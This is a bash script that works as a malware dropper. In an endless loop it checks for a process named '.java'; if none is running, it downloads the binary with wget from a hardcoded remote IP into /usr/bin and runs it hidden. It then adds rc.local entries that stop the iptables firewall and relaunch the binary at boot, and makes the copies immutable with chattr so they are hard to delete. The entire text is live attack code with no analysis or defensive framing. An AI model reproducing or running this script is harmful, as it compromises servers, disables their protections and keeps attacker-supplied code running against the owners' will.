#!/bin/bash

DOWNURL="http://61.160.247.7:223/"
DOWNDIR="/usr/bin/"

run_proc()
{
	chmod 777 $DOWNDIR$1
	nohup $DOWNDIR$1 > /dev/null 2>&1 &
	[ -z "`grep -w \"iptables stop\" /etc/rc.local`" ] && echo "/etc/init.d/iptables stop" >> /etc/rc.local
	[ -z "`grep -w $DOWNDIR$1 /etc/rc.local`" ] && echo "$DOWNDIR$1 &" >> /etc/rc.local
	[ -f "/etc/$1" ] && chattr -i /etc/$1 && \rm -rf /etc/$1
	\cp $DOWNDIR$1 /etc/$1
	chattr +i /etc/$1
	chattr +i $DOWNDIR$1
}

check_proc()
{
	if [ -z "`ps -A|grep -w $1`" ];then
		if [ ! -f "$DOWNDIR$1" ];then
			wget "$DOWNURL$1" -O "$DOWNDIR$1" > /dev/null 2>&1
		fi
		if [ -f "$DOWNDIR$1" ];then
			run_proc $1
		fi
        fi
}

while [ 1 ]
do
	check_proc ".java"
	sleep 3
done
